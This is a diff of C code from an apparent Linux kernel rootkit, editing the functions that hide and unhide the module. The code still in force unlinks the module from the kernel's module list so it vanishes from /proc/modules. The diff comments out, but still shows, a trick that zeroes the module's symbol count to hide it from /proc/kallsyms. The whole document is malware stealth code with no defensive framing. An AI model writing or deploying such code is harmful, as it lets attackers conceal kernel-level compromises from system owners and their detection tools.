@@ -26,11 +26,13 @@ int hide_module(void){
 	// We just delete the module from the list
 	prev = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-	// Hide from /proc/kallsyms
-	// We set num_symtab to 0 so that this if in module_get_kallsyms never successes:
-	// https://elixir.bootlin.com/linux/latest/source/kernel/module.c#L4198
-	num_symtab_old = THIS_MODULE->kallsyms->num_symtab; // TESTING
-	THIS_MODULE->kallsyms->num_symtab = 0; // TESTING
+	// Hide from /proc/kallsyms NOTE: it seems that hiding from /proc/modules also hides from kallsym??
+	// We set num_symtab to 0 so that this if in module_get_kallsyms never succeeds:
+	// https://elixir.bootlin.com/linux/v5.4.6/source/kernel/module.c#L4198
+	//num_symtab_old = THIS_MODULE->kallsyms->num_symtab; // TESTING
+	//printk(KERN_INFO "ROOTKIT: %d\n", num_symtab_old);
+	//THIS_MODULE->kallsyms->num_symtab = 0; // TESTING
+
 	//kobject_del(&THIS_MODULE->mkobj.kobj); //TESTING
 	hidden = 1;
 	return 0;
@@ -42,7 +44,7 @@ int unhide_module(void){
 	list_add(&THIS_MODULE->list, prev); //adds the module after the module which was prev to it
 	//maybe we all die if this prev is not in the list anymore
 
-	THIS_MODULE->kallsyms->num_symtab = num_symtab_old; // TESTING
+	//THIS_MODULE->kallsyms->num_symtab = num_symtab_old; // TESTING
 
 	hidden = 0;
 	return 0;
